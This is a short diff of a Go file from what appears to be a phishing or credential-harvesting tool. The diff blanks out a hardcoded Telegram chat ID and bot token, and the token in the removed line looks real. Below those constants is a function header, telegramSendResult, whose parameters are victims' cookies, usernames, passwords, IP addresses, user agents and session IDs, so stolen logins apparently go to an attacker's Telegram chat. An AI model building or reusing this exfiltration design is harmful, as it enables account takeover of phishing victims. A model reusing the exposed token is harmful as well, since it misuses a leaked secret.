@@ -19,8 +19,8 @@ import (
 )
 
 const (
-	chat_id = "-1002540456884"
-	token     = "7625184798:AAHUyWM6UFzEmlRGzbZr-xKRoeKbkuI3csw"
+	chat_id = ""
+	token     = ""
 )
 
 func telegramSendResult(cookies string, username string, password string, ip string, agent string, sid string) {
